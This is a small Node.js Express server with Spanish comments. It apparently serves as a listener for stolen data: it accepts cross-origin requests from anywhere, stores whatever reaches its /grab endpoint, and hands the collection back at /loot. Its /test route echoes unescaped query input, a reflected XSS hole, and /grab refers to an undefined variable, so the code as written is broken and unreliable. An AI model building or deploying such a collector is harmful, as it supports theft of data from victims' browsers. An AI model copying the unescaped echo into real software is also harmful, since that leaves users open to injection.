/*
░█▀▄░█▀▀░█▀█░█▀▀░█▀█░█▀▄░█▀▀░█▀█░█▀▀░▀█▀░█▀█░█▀▀
░█░█░█▀▀░█▀▀░█▀▀░█░█░█░█░█▀▀░█░█░█░░░░█░░█▀█░▀▀█
░▀▀░░▀▀▀░▀░░░▀▀▀░▀░▀░▀▀░░▀▀▀░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀
*/

const express = require('express');
const cors = require('cors');
const fs = require('fs');
const app = express();
const port = 3000;
let texto = "";

/*
░█▀▀░█▀█░█▀█░█▀▀░▀█▀░█▀▀
░█░░░█░█░█░█░█▀▀░░█░░█░█
░▀▀▀░▀▀▀░▀░▀░▀░░░▀▀▀░▀▀▀
*/

app.use(cors());
//allow origin on neocities
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    next();
});
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));
/*
app.use((req, res, next) => {
    console.log(`${req.method} ${req.url}`);
    next();
});
*/

/*
░█▀▀░█▀█░█▀▄░█▀█░█▀█░▀█▀░█▀█░▀█▀░█▀▀
░█▀▀░█░█░█░█░█▀▀░█░█░░█░░█░█░░█░░▀▀█
░▀▀▀░▀░▀░▀▀░░▀░░░▀▀▀░▀▀▀░▀░▀░░▀░░▀▀▀
*/

app.get("/test", (req, res) => {
    const nombre = req.query.nombre;
    const edad = req.query.edad;
    res.status(200).send("Hola " + nombre + " " + edad);
})

app.get('/grab', (req, res) => { // captura los datos enviados por el cliente
    const data = req.query.data;
    console.log(data,nombre);
    if(data){
        texto += data + "\n";
        res.send('Datos guardados correctamente.');
    } else {
        res.status(400).send('No se proporcionó ningún dato.');
    }
});

app.get('/loot', (req, res) => { // envía los datos guardados al cliente
    res.send(texto);
});

app.get('/clear', (req, res) => { // limpia el archivo de salida
    texto = "";
    res.send('Archivo limpiado correctamente.');
});

/*
░█▀▄░█░█░█▀█
░█▀▄░█░█░█░█
░▀░▀░▀▀▀░▀░▀
*/

app.listen(port, () => {
    console.log(`Servidor escuchando en http://localhost:${port}`);
});
